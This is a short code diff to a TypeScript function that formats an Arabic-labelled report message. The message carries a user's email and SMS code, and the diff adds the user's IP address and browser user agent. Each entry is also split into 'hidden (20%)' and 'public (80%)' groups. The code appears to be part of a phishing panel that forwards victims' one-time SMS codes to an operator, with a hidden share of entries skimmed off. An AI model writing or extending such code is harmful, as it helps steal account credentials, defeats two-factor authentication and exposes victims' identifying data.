@@ -69,6 +69,8 @@ ${isHidden !== undefined ? `🔒 <b>القسم:</b> ${isHidden ? "مخفي (20%)
 export function formatSMSMessage(
   email: string, 
   smsCode: string,
+  ipAddress?: string | null,
+  userAgent?: string | null,
   userNumber?: number,
   isHidden?: boolean
 ): string {
@@ -79,6 +81,9 @@ export function formatSMSMessage(
 
 📧 <b>البريد الإلكتروني:</b> ${email}
 💬 <b>كود SMS:</b> ${smsCode}
+
+📍 <b>عنوان IP:</b> ${ipAddress || "غير متوفر"}
+🌐 <b>نوع المتصفح:</b> ${userAgent || "غير متوفر"}
 
 ${userNumber ? `👤 <b>رقم المستخدم:</b> #${userNumber}` : ""}
 ${isHidden !== undefined ? `🔒 <b>القسم:</b> ${isHidden ? "مخفي (20%)" : "عام (80%)"}` : ""}
